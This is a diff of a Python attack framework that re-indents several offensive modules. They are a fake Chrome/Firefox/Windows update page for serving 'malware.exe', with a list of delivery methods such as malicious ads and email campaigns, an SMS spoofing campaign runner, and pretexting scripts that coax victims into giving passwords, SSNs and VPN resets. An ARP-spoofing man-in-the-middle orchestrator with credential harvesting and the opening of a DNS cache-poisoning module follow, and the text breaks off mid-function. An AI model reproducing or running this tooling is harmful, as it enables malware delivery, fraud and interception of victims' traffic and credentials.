@@ -35466,207 +35466,207 @@ END:VCARD"""
         # Placeholder for cleanup logic
         pass
     
-        def run_fake_update(self):
-            """Fake software update page generator"""
-            software = self.module_options.get('software', 'chrome')
-            payload = self.module_options.get('payload', 'update.exe')
-            port = self.module_options.get('port', '8080')
-            
-            print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}║ FAKE UPDATE GENERATOR ║{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-            
-            templates = {
-                'chrome': {
-                    'title': 'Chrome Update Required',
-                    'message': 'A new version of Chrome is available',
-                    'button': 'Update Chrome'
-                },
-                'firefox': {
-                    'title': 'Firefox Update Available',
-                    'message': 'Firefox must be updated to continue',
-                    'button': 'Update Firefox'
-                },
-                'flash': {
-                    'title': 'Flash Player Update',
-                    'message': 'Flash Player is out of date',
-                    'button': 'Update Flash Player'
-                },
-                'windows': {
-                    'title': 'Windows Security Update',
-                    'message': 'Critical security update required',
-                    'button': 'Install Update'
-                }
+    def run_fake_update(self):
+        """Fake software update page generator"""
+        software = self.module_options.get('software', 'chrome')
+        payload = self.module_options.get('payload', 'update.exe')
+        port = self.module_options.get('port', '8080')
+        
+        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ FAKE UPDATE GENERATOR ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+        
+        templates = {
+            'chrome': {
+                'title': 'Chrome Update Required',
+                'message': 'A new version of Chrome is available',
+                'button': 'Update Chrome'
+            },
+            'firefox': {
+                'title': 'Firefox Update Available',
+                'message': 'Firefox must be updated to continue',
+                'button': 'Update Firefox'
+            },
+            'flash': {
+                'title': 'Flash Player Update',
+                'message': 'Flash Player is out of date',
+                'button': 'Update Flash Player'
+            },
+            'windows': {
+                'title': 'Windows Security Update',
+                'message': 'Critical security update required',
+                'button': 'Install Update'
             }
-            
-            template = templates.get(software, templates['chrome'])
-            
-            html_content = f"""<!DOCTYPE html>
+        }
+        
+        template = templates.get(software, templates['chrome'])
+        
+        html_content = f"""<!DOCTYPE html>
     <html>
     <head>
-        <title>{template['title']}</title>
-        <style>
-            body {{
-                font-family: Arial, sans-serif;
-                background: #f0f0f0;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                height: 100vh;
-                margin: 0;
-            }}
-            .update-box {{
-                background: white;
-                padding: 40px;
-                border-radius: 8px;
-                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-                text-align: center;
-                max-width: 400px;
-            }}
-            .icon {{
-                font-size: 64px;
-                margin-bottom: 20px;
-            }}
-            h1 {{
-                color: #333;
-                font-size: 24px;
-                margin-bottom: 10px;
-            }}
-            p {{
-                color: #666;
-                margin-bottom: 30px;
-            }}
-            .update-btn {{
-                background: #4285f4;
-                color: white;
-                border: none;
-                padding: 12px 30px;
-                font-size: 16px;
-                border-radius: 4px;
-                cursor: pointer;
-            }}
-            .update-btn:hover {{
-                background: #357ae8;
-            }}
-        </style>
+    <title>{template['title']}</title>
+    <style>
+        body {{
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }}
+        .update-box {{
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 400px;
+        }}
+        .icon {{
+            font-size: 64px;
+            margin-bottom: 20px;
+        }}
+        h1 {{
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }}
+        p {{
+            color: #666;
+            margin-bottom: 30px;
+        }}
+        .update-btn {{
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }}
+        .update-btn:hover {{
+            background: #357ae8;
+        }}
+    </style>
     </head>
     <body>
-        <div class="update-box">
-            <div class="icon">️</div>
-            <h1>{template['title']}</h1>
-            <p>{template['message']}</p>
-            <a href="/{payload}" download>
-                <button class="update-btn">{template['button']}</button>
-            </a>
-        </div>
+    <div class="update-box">
+        <div class="icon">️</div>
+        <h1>{template['title']}</h1>
+        <p>{template['message']}</p>
+        <a href="/{payload}" download>
+            <button class="update-btn">{template['button']}</button>
+        </a>
+    </div>
     </body>
     </html>"""
-            
-            output_dir = f"fake_update_{software}"
-            os.makedirs(output_dir, exist_ok=True)
-            
-            with open(f"{output_dir}/index.html", 'w') as f:
-                f.write(html_content)
-            
-            print(f"{Fore.GREEN} Fake update page generated!{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}→ Location: {Fore.WHITE}{output_dir}/index.html{Style.RESET_ALL}\n")
-            
-            print(f"{Fore.YELLOW} Setup:{Style.RESET_ALL}")
-            print(f" 1. Place payload: {Fore.CYAN}cp malware.exe {output_dir}/{payload}{Style.RESET_ALL}")
-            print(f" 2. Start server: {Fore.CYAN}python3 -m http.server {port} --directory {output_dir}{Style.RESET_ALL}")
-            print(f" 3. Access at: {Fore.CYAN}http://{self.config['lhost']}:{port}{Style.RESET_ALL}\n")
-            
-            print(f"{Fore.BLUE}ℹ Delivery methods:{Style.RESET_ALL}")
-            print(f" • Watering hole attacks")
-            print(f" • Compromised websites")
-            print(f" • Malicious ads")
-            print(f" • Email campaigns")
         
-        def run_sms_spoofing(self):
-            """
-            ╔══════════════════════════════════════════════════════════════════╗
-            ║          SMS SPOOFING - Enterprise Campaign Platform             ║
-            ║                                                                  ║
-            ║  • Multi-Provider Support  • Advanced Analytics & Tracking      ║
-            ║  • 50+ Templates          • Intelligent Rate Limiting            ║
-            ║  • Scheduling & Automation • Compliance & Security               ║
-            ║  • Real-time Dashboard     • A/B Testing & Optimization          ║
-            ╚══════════════════════════════════════════════════════════════════╝
-            """
-            print(f"\n{Fore.CYAN}{'=' * 70}")
-            print(f"  SMS SPOOFING - Enterprise Campaign Platform")
-            print(f"{'=' * 70}{Style.RESET_ALL}\n")
-            
-            # Load and validate configuration
-            config = self._load_sms_config()
-            if not config:
-                print(f"{Fore.RED}✗ ERROR: Configuration loading failed{Style.RESET_ALL}")
-                return
-            
-            # Display configuration
-            self._display_sms_config(config)
-            
-            # Initialize database for tracking
-            db_conn = self._initialize_sms_database(config)
-            if not db_conn:
-                print(f"{Fore.YELLOW}⚠ WARNING: Database initialization failed - continuing without analytics{Style.RESET_ALL}")
-            
-            # Validate provider credentials
-            provider_valid = self._validate_sms_provider(config)
-            if not provider_valid:
-                print(f"{Fore.RED}✗ ERROR: SMS provider validation failed{Style.RESET_ALL}")
-                if db_conn:
-                    db_conn.close()
-                return
-            
-            # Load and validate targets
-            targets = self._load_sms_targets(config)
-            if not targets:
-                print(f"{Fore.RED}✗ ERROR: No valid targets loaded{Style.RESET_ALL}")
-                if db_conn:
-                    db_conn.close()
-                return
-            
-            print(f"{Fore.GREEN}✓ Loaded {len(targets)} target(s){Style.RESET_ALL}")
-            
-            # Check dry run mode
-            if config.get('dry_run'):
-                print(f"\n{Fore.YELLOW}⚠ DRY RUN MODE - No messages will be sent{Style.RESET_ALL}")
-                self._dry_run_simulation(config, targets, db_conn)
-                if db_conn:
-                    db_conn.close()
-                return
-            
-            # Check scheduling
-            if config.get('schedule') != 'now':
-                print(f"\n{Fore.CYAN}⏰ Campaign scheduled for: {config['schedule']}{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ Use scheduler to execute at specified time{Style.RESET_ALL}\n")
-                self._schedule_sms_campaign(config, targets, db_conn)
-                return
-            
-            # Execute campaign
-            print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
-            print(f"║                    EXECUTING CAMPAIGN                            ║")
-            print(f"╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-            
-            results = self._execute_sms_campaign(config, targets, db_conn)
-            
-            # Display results
-            self._display_sms_results(results, config)
-            
-            # Generate reports
-            if config.get('generate_dashboard'):
-                report_files = self._generate_sms_reports(results, config, db_conn)
-                if report_files:
-                    print(f"\n{Fore.GREEN}✓ Reports generated:{Style.RESET_ALL}")
-                    for report_type, filepath in report_files.items():
-                        print(f"  • {report_type.upper()}: {filepath}")
-            
-            # Cleanup
+        output_dir = f"fake_update_{software}"
+        os.makedirs(output_dir, exist_ok=True)
+        
+        with open(f"{output_dir}/index.html", 'w') as f:
+            f.write(html_content)
+        
+        print(f"{Fore.GREEN} Fake update page generated!{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}→ Location: {Fore.WHITE}{output_dir}/index.html{Style.RESET_ALL}\n")
+        
+        print(f"{Fore.YELLOW} Setup:{Style.RESET_ALL}")
+        print(f" 1. Place payload: {Fore.CYAN}cp malware.exe {output_dir}/{payload}{Style.RESET_ALL}")
+        print(f" 2. Start server: {Fore.CYAN}python3 -m http.server {port} --directory {output_dir}{Style.RESET_ALL}")
+        print(f" 3. Access at: {Fore.CYAN}http://{self.config['lhost']}:{port}{Style.RESET_ALL}\n")
+        
+        print(f"{Fore.BLUE}ℹ Delivery methods:{Style.RESET_ALL}")
+        print(f" • Watering hole attacks")
+        print(f" • Compromised websites")
+        print(f" • Malicious ads")
+        print(f" • Email campaigns")
+    
+    def run_sms_spoofing(self):
+        """
+        ╔══════════════════════════════════════════════════════════════════╗
+        ║          SMS SPOOFING - Enterprise Campaign Platform             ║
+        ║                                                                  ║
+        ║  • Multi-Provider Support  • Advanced Analytics & Tracking      ║
+        ║  • 50+ Templates          • Intelligent Rate Limiting            ║
+        ║  • Scheduling & Automation • Compliance & Security               ║
+        ║  • Real-time Dashboard     • A/B Testing & Optimization          ║
+        ╚══════════════════════════════════════════════════════════════════╝
+        """
+        print(f"\n{Fore.CYAN}{'=' * 70}")
+        print(f"  SMS SPOOFING - Enterprise Campaign Platform")
+        print(f"{'=' * 70}{Style.RESET_ALL}\n")
+        
+        # Load and validate configuration
+        config = self._load_sms_config()
+        if not config:
+            print(f"{Fore.RED}✗ ERROR: Configuration loading failed{Style.RESET_ALL}")
+            return
+        
+        # Display configuration
+        self._display_sms_config(config)
+        
+        # Initialize database for tracking
+        db_conn = self._initialize_sms_database(config)
+        if not db_conn:
+            print(f"{Fore.YELLOW}⚠ WARNING: Database initialization failed - continuing without analytics{Style.RESET_ALL}")
+        
+        # Validate provider credentials
+        provider_valid = self._validate_sms_provider(config)
+        if not provider_valid:
+            print(f"{Fore.RED}✗ ERROR: SMS provider validation failed{Style.RESET_ALL}")
             if db_conn:
                 db_conn.close()
-            
-            print(f"\n{Fore.GREEN}✓ Campaign completed successfully{Style.RESET_ALL}\n")
+            return
+        
+        # Load and validate targets
+        targets = self._load_sms_targets(config)
+        if not targets:
+            print(f"{Fore.RED}✗ ERROR: No valid targets loaded{Style.RESET_ALL}")
+            if db_conn:
+                db_conn.close()
+            return
+        
+        print(f"{Fore.GREEN}✓ Loaded {len(targets)} target(s){Style.RESET_ALL}")
+        
+        # Check dry run mode
+        if config.get('dry_run'):
+            print(f"\n{Fore.YELLOW}⚠ DRY RUN MODE - No messages will be sent{Style.RESET_ALL}")
+            self._dry_run_simulation(config, targets, db_conn)
+            if db_conn:
+                db_conn.close()
+            return
+        
+        # Check scheduling
+        if config.get('schedule') != 'now':
+            print(f"\n{Fore.CYAN}⏰ Campaign scheduled for: {config['schedule']}{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ Use scheduler to execute at specified time{Style.RESET_ALL}\n")
+            self._schedule_sms_campaign(config, targets, db_conn)
+            return
+        
+        # Execute campaign
+        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════╗")
+        print(f"║                    EXECUTING CAMPAIGN                            ║")
+        print(f"╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+        
+        results = self._execute_sms_campaign(config, targets, db_conn)
+        
+        # Display results
+        self._display_sms_results(results, config)
+        
+        # Generate reports
+        if config.get('generate_dashboard'):
+            report_files = self._generate_sms_reports(results, config, db_conn)
+            if report_files:
+                print(f"\n{Fore.GREEN}✓ Reports generated:{Style.RESET_ALL}")
+                for report_type, filepath in report_files.items():
+                    print(f"  • {report_type.upper()}: {filepath}")
+        
+        # Cleanup
+        if db_conn:
+            db_conn.close()
+        
+        print(f"\n{Fore.GREEN}✓ Campaign completed successfully{Style.RESET_ALL}\n")
     
         def _load_sms_config(self):
             """Load and validate SMS spoofing configuration with defaults"""
@@ -36570,181 +36570,181 @@ END:VCARD"""
                 print(f"{Fore.RED}✗ ERROR: Failed to write dashboard: {str(e)}{Style.RESET_ALL}")
                 return None
     
-        def run_pretexting(self):
-            """Pretexting scenario generator"""
-            scenario = self.module_options.get('scenario', 'it_support')
-            company = self.module_options.get('company', 'TechCorp')
-            urgency = self.module_options.get('urgency', 'high')
-            
-            print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}║ PRETEXTING SCENARIO GENERATOR ║{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-            
-            scenarios = {
-                'it_support': {
-                    'role': 'IT Support Technician',
-                    'opening': f"Hi, this is Alex from {company} IT Support. We've detected some suspicious activity on your account.",
-                    'urgency_reason': 'Your account may be compromised. We need to verify your identity immediately.',
-                    'request': 'Can you verify your employee ID and current password so I can reset it for you?',
-                    'alternative': 'Could you click this verification link to secure your account?'
-                },
-                'vendor': {
-                    'role': 'Vendor/Supplier',
-                    'opening': f"Good morning, I'm calling from {company}'s main supplier. We need to update our billing information.",
-                    'urgency_reason': 'Our payment system was updated and we need to confirm your details to avoid service interruption.',
-                    'request': 'Can you provide the accounts payable contact and their email?',
-                    'alternative': 'Could you forward this billing update form to your finance department?'
-                },
-                'executive': {
-                    'role': 'Executive Assistant',
-                    'opening': f"Hi, I'm calling on behalf of {company}'s CEO who is traveling.",
-                    'urgency_reason': 'The CEO needs urgent access to a file for a board meeting happening in 30 minutes.',
-                    'request': 'Can you email the Q4 financial report to this temporary address?',
-                    'alternative': 'Could you reset the CEO\'s VPN password and send it to me?'
-                },
-                'hr': {
-                    'role': 'HR Representative',
-                    'opening': f"Hello, this is Sarah from {company} Human Resources.",
-                    'urgency_reason': 'We need to update employee records before the audit tomorrow.',
-                    'request': 'Can you verify your social security number and home address?',
-                    'alternative': 'Please fill out this employee verification form we\'re emailing you.'
-                },
-                'security': {
-                    'role': 'Security Officer',
-                    'opening': f"This is Officer Johnson from {company} Corporate Security.",
-                    'urgency_reason': 'We detected unauthorized access attempts to your account.',
-                    'request': 'I need you to change your password right now while I verify your identity.',
-                    'alternative': 'Click this secure link to update your security settings immediately.'
-                }
+    def run_pretexting(self):
+        """Pretexting scenario generator"""
+        scenario = self.module_options.get('scenario', 'it_support')
+        company = self.module_options.get('company', 'TechCorp')
+        urgency = self.module_options.get('urgency', 'high')
+        
+        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ PRETEXTING SCENARIO GENERATOR ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+        
+        scenarios = {
+            'it_support': {
+                'role': 'IT Support Technician',
+                'opening': f"Hi, this is Alex from {company} IT Support. We've detected some suspicious activity on your account.",
+                'urgency_reason': 'Your account may be compromised. We need to verify your identity immediately.',
+                'request': 'Can you verify your employee ID and current password so I can reset it for you?',
+                'alternative': 'Could you click this verification link to secure your account?'
+            },
+            'vendor': {
+                'role': 'Vendor/Supplier',
+                'opening': f"Good morning, I'm calling from {company}'s main supplier. We need to update our billing information.",
+                'urgency_reason': 'Our payment system was updated and we need to confirm your details to avoid service interruption.',
+                'request': 'Can you provide the accounts payable contact and their email?',
+                'alternative': 'Could you forward this billing update form to your finance department?'
+            },
+            'executive': {
+                'role': 'Executive Assistant',
+                'opening': f"Hi, I'm calling on behalf of {company}'s CEO who is traveling.",
+                'urgency_reason': 'The CEO needs urgent access to a file for a board meeting happening in 30 minutes.',
+                'request': 'Can you email the Q4 financial report to this temporary address?',
+                'alternative': 'Could you reset the CEO\'s VPN password and send it to me?'
+            },
+            'hr': {
+                'role': 'HR Representative',
+                'opening': f"Hello, this is Sarah from {company} Human Resources.",
+                'urgency_reason': 'We need to update employee records before the audit tomorrow.',
+                'request': 'Can you verify your social security number and home address?',
+                'alternative': 'Please fill out this employee verification form we\'re emailing you.'
+            },
+            'security': {
+                'role': 'Security Officer',
+                'opening': f"This is Officer Johnson from {company} Corporate Security.",
+                'urgency_reason': 'We detected unauthorized access attempts to your account.',
+                'request': 'I need you to change your password right now while I verify your identity.',
+                'alternative': 'Click this secure link to update your security settings immediately.'
             }
-            
-            if scenario in scenarios:
-                s = scenarios[scenario]
-                print(f"{Fore.YELLOW}Scenario: {Fore.WHITE}{scenario.replace('_', ' ').title()}{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}Role: {Fore.WHITE}{s['role']}{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}Company: {Fore.WHITE}{company}{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}Urgency: {Fore.WHITE}{urgency.upper()}{Style.RESET_ALL}\n")
-                
-                print(f"{Fore.CYAN}═══ SCRIPT ═══{Style.RESET_ALL}\n")
-                print(f"{Fore.GREEN}Opening:{Style.RESET_ALL}")
-                print(f"{Fore.WHITE}\"{s['opening']}\"{Style.RESET_ALL}\n")
-                
-                print(f"{Fore.YELLOW}Urgency Factor:{Style.RESET_ALL}")
-                print(f"{Fore.WHITE}\"{s['urgency_reason']}\"{Style.RESET_ALL}\n")
-                
-                print(f"{Fore.RED}Primary Request:{Style.RESET_ALL}")
-                print(f"{Fore.WHITE}\"{s['request']}\"{Style.RESET_ALL}\n")
-                
-                print(f"{Fore.BLUE}Alternative Approach:{Style.RESET_ALL}")
-                print(f"{Fore.WHITE}\"{s['alternative']}\"{Style.RESET_ALL}\n")
-                
-                print(f"{Fore.CYAN}═══ TIPS ═══{Style.RESET_ALL}\n")
-                print(f" • Use confident, authoritative tone")
-                print(f" • Build rapport before making requests")
-                print(f" • Create time pressure with urgency")
-                print(f" • Use company-specific terminology")
-                print(f" • Have plausible answers for questions")
-                print(f" • Know when to abandon if suspicious\n")
+        }
         
-        # ============ NETWORK ATTACK MODULES ============
+        if scenario in scenarios:
+            s = scenarios[scenario]
+            print(f"{Fore.YELLOW}Scenario: {Fore.WHITE}{scenario.replace('_', ' ').title()}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}Role: {Fore.WHITE}{s['role']}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}Company: {Fore.WHITE}{company}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}Urgency: {Fore.WHITE}{urgency.upper()}{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.CYAN}═══ SCRIPT ═══{Style.RESET_ALL}\n")
+            print(f"{Fore.GREEN}Opening:{Style.RESET_ALL}")
+            print(f"{Fore.WHITE}\"{s['opening']}\"{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.YELLOW}Urgency Factor:{Style.RESET_ALL}")
+            print(f"{Fore.WHITE}\"{s['urgency_reason']}\"{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.RED}Primary Request:{Style.RESET_ALL}")
+            print(f"{Fore.WHITE}\"{s['request']}\"{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.BLUE}Alternative Approach:{Style.RESET_ALL}")
+            print(f"{Fore.WHITE}\"{s['alternative']}\"{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.CYAN}═══ TIPS ═══{Style.RESET_ALL}\n")
+            print(f" • Use confident, authoritative tone")
+            print(f" • Build rapport before making requests")
+            print(f" • Create time pressure with urgency")
+            print(f" • Use company-specific terminology")
+            print(f" • Have plausible answers for questions")
+            print(f" • Know when to abandon if suspicious\n")
+    
+    # ============ NETWORK ATTACK MODULES ============
+    
+    def run_arp_spoof(self):
+        """
+        Enterprise ARP Spoofing & MITM Platform
+        Complete Man-in-the-Middle attack platform with credential harvesting
+        """
+        from colorama import Fore, Style
+        import os
+        import time
+        import signal
+        import sys
         
-        def run_arp_spoof(self):
-            """
-            Enterprise ARP Spoofing & MITM Platform
-            Complete Man-in-the-Middle attack platform with credential harvesting
-            """
-            from colorama import Fore, Style
-            import os
-            import time
-            import signal
-            import sys
-            
-            print(f"\n{Fore.CYAN}{'=' * 70}")
-            print(f"  ARP SPOOF & MITM PLATFORM - ENTERPRISE EDITION")
-            print(f"{'=' * 70}{Style.RESET_ALL}\n")
-            
-            # Check for scapy
+        print(f"\n{Fore.CYAN}{'=' * 70}")
+        print(f"  ARP SPOOF & MITM PLATFORM - ENTERPRISE EDITION")
+        print(f"{'=' * 70}{Style.RESET_ALL}\n")
+        
+        # Check for scapy
+        try:
+            from scapy.all import ARP, Ether, send, sniff, get_if_hwaddr, conf, srp, wrpcap
+            SCAPY_AVAILABLE = True
+        except ImportError:
+            print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
+            return
+        
+        # Check root privileges
+        if os.geteuid() != 0:
+            print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
+            return
+        
+        # Load configuration
+        config = self._load_arp_spoof_config()
+        if not config:
+            print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
+            return
+        
+        # Display configuration
+        self._display_arp_spoof_config(config)
+        
+        # Confirm attack
+        if config['confirm_targets']:
+            response = input(f"\n{Fore.YELLOW}⚠  Proceed with MITM attack? (yes/no): {Style.RESET_ALL}")
+            if response.lower() not in ['yes', 'y']:
+                print(f"{Fore.BLUE}ℹ  Attack cancelled{Style.RESET_ALL}")
+                return
+        
+        # Initialize database
+        if config['enable_database']:
             try:
-                from scapy.all import ARP, Ether, send, sniff, get_if_hwaddr, conf, srp, wrpcap
-                SCAPY_AVAILABLE = True
-            except ImportError:
-                print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
-                return
-            
-            # Check root privileges
-            if os.geteuid() != 0:
-                print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
-                print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
-                return
-            
-            # Load configuration
-            config = self._load_arp_spoof_config()
-            if not config:
-                print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
-                return
-            
-            # Display configuration
-            self._display_arp_spoof_config(config)
-            
-            # Confirm attack
-            if config['confirm_targets']:
-                response = input(f"\n{Fore.YELLOW}⚠  Proceed with MITM attack? (yes/no): {Style.RESET_ALL}")
-                if response.lower() not in ['yes', 'y']:
-                    print(f"{Fore.BLUE}ℹ  Attack cancelled{Style.RESET_ALL}")
-                    return
-            
-            # Initialize database
-            if config['enable_database']:
-                try:
-                    self._initialize_mitm_database(config)
-                    print(f"{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}\n")
-                except Exception as e:
-                    print(f"{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}\n")
-            
-            # Backup ARP tables
-            if config['backup_arp_tables']:
-                self._backup_arp_tables(config)
-            
-            # Enable IP forwarding
-            if config['enable_ip_forward']:
-                self._enable_ip_forwarding()
-                print(f"{Fore.GREEN}✓ IP forwarding enabled{Style.RESET_ALL}")
-            
-            # Setup signal handlers
-            def signal_handler(sig, frame):
-                print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
-                self._cleanup_arp_spoof(config)
-                sys.exit(0)
-            
-            signal.signal(signal.SIGINT, signal_handler)
-            signal.signal(signal.SIGTERM, signal_handler)
-            
-            # Get MAC addresses
-            print(f"{Fore.CYAN}━━━ RESOLVING MAC ADDRESSES ━━━{Style.RESET_ALL}\n")
-            target_mac = self._get_mac_address(config['target_ip'], config['interface'])
-            gateway_mac = self._get_mac_address(config['gateway_ip'], config['interface'])
-            
-            if not target_mac or not gateway_mac:
-                print(f"{Fore.RED}✗ ERROR: Could not resolve MAC addresses{Style.RESET_ALL}")
-                return
-            
-            print(f"{Fore.GREEN}✓ Target MAC:  {target_mac}{Style.RESET_ALL}")
-            print(f"{Fore.GREEN}✓ Gateway MAC: {gateway_mac}{Style.RESET_ALL}\n")
-            
-            # Start packet capture
-            if config['enable_packet_capture']:
-                print(f"{Fore.CYAN}━━━ STARTING PACKET CAPTURE ━━━{Style.RESET_ALL}\n")
-                self._start_packet_capture(config)
-            
-            # Start ARP poisoning
-            print(f"{Fore.CYAN}━━━ STARTING ARP POISONING ━━━{Style.RESET_ALL}\n")
-            print(f"{Fore.YELLOW}→ Mode: {config['mode']}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}→ Interval: {config['poison_interval']}s{Style.RESET_ALL}")
-            print(f"{Fore.GREEN}→ MITM active - press Ctrl+C to stop{Style.RESET_ALL}\n")
-            
-            # Main attack loop
-            self._arp_poison_loop(config, target_mac, gateway_mac)
+                self._initialize_mitm_database(config)
+                print(f"{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}\n")
+            except Exception as e:
+                print(f"{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}\n")
+        
+        # Backup ARP tables
+        if config['backup_arp_tables']:
+            self._backup_arp_tables(config)
+        
+        # Enable IP forwarding
+        if config['enable_ip_forward']:
+            self._enable_ip_forwarding()
+            print(f"{Fore.GREEN}✓ IP forwarding enabled{Style.RESET_ALL}")
+        
+        # Setup signal handlers
+        def signal_handler(sig, frame):
+            print(f"\n\n{Fore.YELLOW}⚠  Interrupt received - cleaning up...{Style.RESET_ALL}\n")
+            self._cleanup_arp_spoof(config)
+            sys.exit(0)
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        
+        # Get MAC addresses
+        print(f"{Fore.CYAN}━━━ RESOLVING MAC ADDRESSES ━━━{Style.RESET_ALL}\n")
+        target_mac = self._get_mac_address(config['target_ip'], config['interface'])
+        gateway_mac = self._get_mac_address(config['gateway_ip'], config['interface'])
+        
+        if not target_mac or not gateway_mac:
+            print(f"{Fore.RED}✗ ERROR: Could not resolve MAC addresses{Style.RESET_ALL}")
+            return
+        
+        print(f"{Fore.GREEN}✓ Target MAC:  {target_mac}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}✓ Gateway MAC: {gateway_mac}{Style.RESET_ALL}\n")
+        
+        # Start packet capture
+        if config['enable_packet_capture']:
+            print(f"{Fore.CYAN}━━━ STARTING PACKET CAPTURE ━━━{Style.RESET_ALL}\n")
+            self._start_packet_capture(config)
+        
+        # Start ARP poisoning
+        print(f"{Fore.CYAN}━━━ STARTING ARP POISONING ━━━{Style.RESET_ALL}\n")
+        print(f"{Fore.YELLOW}→ Mode: {config['mode']}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}→ Interval: {config['poison_interval']}s{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}→ MITM active - press Ctrl+C to stop{Style.RESET_ALL}\n")
+        
+        # Main attack loop
+        self._arp_poison_loop(config, target_mac, gateway_mac)
     
     
         def _load_arp_spoof_config(self):
@@ -37582,96 +37582,96 @@ END:VCARD"""
             with open(output_file, 'w') as f:
                 f.write(html)
         
-        def run_dns_spoof(self):
-            """
-            Enterprise DNS Spoofing & Cache Poisoning Platform
-            Main orchestrator for DNS manipulation operations
-            """
-            from colorama import Fore, Style
-            import socket
-            import struct
-            import threading
-            import time
-            
-            print(f"\n{Fore.CYAN}{'=' * 70}")
-            print(f"  DNS SPOOF & CACHE POISONING PLATFORM - ENTERPRISE EDITION")
-            print(f"{'=' * 70}{Style.RESET_ALL}\n")
-            
-            # Check for scapy
+    def run_dns_spoof(self):
+        """
+        Enterprise DNS Spoofing & Cache Poisoning Platform
+        Main orchestrator for DNS manipulation operations
+        """
+        from colorama import Fore, Style
+        import socket
+        import struct
+        import threading
+        import time
+        
+        print(f"\n{Fore.CYAN}{'=' * 70}")
+        print(f"  DNS SPOOF & CACHE POISONING PLATFORM - ENTERPRISE EDITION")
+        print(f"{'=' * 70}{Style.RESET_ALL}\n")
+        
+        # Check for scapy
+        try:
+            from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send, sr1
+            SCAPY_AVAILABLE = True
+        except ImportError:
+            print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
+            return
+        
+        # Check root privileges
+        import os
+        if os.geteuid() != 0:
+            print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
+            return
+        
+        # Load configuration
+        config = self._load_dns_spoof_config()
+        if not config:
+            print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
+            return
+        
+        # Display configuration
+        self._display_dns_spoof_config(config)
+        
+        # Confirm operation
+        if config['confirm_spoof']:
+            response = input(f"\n{Fore.YELLOW}⚠  Proceed with DNS spoofing? (yes/no): {Style.RESET_ALL}")
+            if response.lower() not in ['yes', 'y']:
